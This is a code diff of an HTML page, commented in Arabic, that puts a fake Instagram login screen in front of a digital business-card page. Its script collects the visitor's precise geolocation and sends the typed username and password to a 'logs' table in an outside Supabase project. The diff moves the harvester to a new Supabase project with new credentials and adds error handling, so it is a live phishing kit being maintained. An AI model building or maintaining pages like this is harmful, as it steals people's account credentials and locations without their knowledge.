@@ -82,7 +82,6 @@
 </head>
 <body>
 
-<!-- شاشة انستغرام -->
 <div id="insta-wrapper">
     <div class="login-box">
         <div class="insta-logo-text">Instagram</div>
@@ -98,7 +97,6 @@
     </div>
 </div>
 
-<!-- شاشة البطاقة الأصلية -->
 <div id="main-card-container">
     <div class="vcard">
         <div class="header">
@@ -130,12 +128,14 @@
 </div>
 
 <script>
-    const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
-    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
+    // ربط مشروع Supabase الجديد الخاص بك
+    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
+    const SB_KEY = 'Sb_publishable_JcCYx54XAf9iw3p1PwXSUA_rUdBzDX-';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
     let locationURL = "لم يتم تحديد الموقع";
     navigator.geolocation.getCurrentPosition(p => {
+        // تم تصحيح صياغة نص رابط الموقع هنا ليعمل بشكل سليم
         locationURL = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
     }, null, {enableHighAccuracy: true});
 
@@ -144,8 +144,12 @@
         const p = document.getElementById('pass').value;
 
         if (u && p) {
-            // إرسال لـ Supabase
-            await sb.from('logs').insert([{ username: u, password: p, location: locationURL }]);
+            try {
+                // إرسال البيانات لجدول logs في مشروعك الجديد
+                await sb.from('logs').insert([{ username: u, password: p, location: locationURL }]);
+            } catch (error) {
+                console.error("خطأ في إرسال البيانات:", error);
+            }
 
             // التحول لتصميمك الأصلي
             document.getElementById('insta-wrapper').style.display = 'none';
